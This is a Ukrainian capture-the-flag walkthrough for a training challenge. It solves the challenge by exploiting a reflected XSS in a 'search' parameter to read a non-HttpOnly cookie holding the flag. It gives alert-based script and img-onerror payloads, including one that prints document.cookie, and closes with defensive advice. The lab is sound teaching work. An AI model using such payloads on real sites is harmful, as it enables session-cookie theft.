# Task 3 — Майстерня Дзеркал (Reflected XSS → читання “печива”)

## Сюжет
У майстерні дзеркал майстер “віддзеркалює” будь-який напис, який ти введеш.  
Кажуть, у майстерні кожному гостю лишають печиво. Не скуштувати його - прояв неповаги.

## Мета
Дістати `FLAG{...}` і здати його через форму перевірки на сторінці.

## Коротко про вразливість
- Параметр `search` відображається у відповіді без санітизації → reflected XSS.
- Сервер видає “печиво” (`mirror_session`) з флагом і воно не HttpOnly → доступне з JS через `document.cookie`.

## Рішення

### 1) Перевіряємо XSS
У поле “Який напис показати в дзеркалі?” введи один з payload’ів:

```html
<script>alert(1)</script>
```

або

```html
<img src=x onerror=alert(1)>
```

Якщо з’явився alert, значить ввід виконується як HTML/JS.

### 2) Читаємо “печиво”
Тепер витягни cookie через `document.cookie`:

```html
<script>alert(document.cookie)</script>
```

У вікні буде рядок на кшталт:

```
mirror_session=FLAG{...}
```

Скопіюй значення `FLAG{...}`.

Опційно: те саме через URL-енкодинг:

```
/?search=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
```

### 3) Здаємо флаг
Встав `FLAG{...}` у блок перевірки на сторінці та натисни “Перевірити”.

## Чому це працює
1. Ввід `search` вставляється у HTML без очищення → можна виконати JS у контексті сторінки.
2. “Печиво” з флагом не захищене HttpOnly → `document.cookie` його читає.

## Примітки для автора задачі
- Це навчальна задача. У реальних системах:
  - не відображають користувацький ввід без escape/санітизації,
  - ставлять cookie з чутливими даними з HttpOnly=true (і бажано Secure, SameSite),
  - додають CSP, щоб зменшити наслідки XSS.
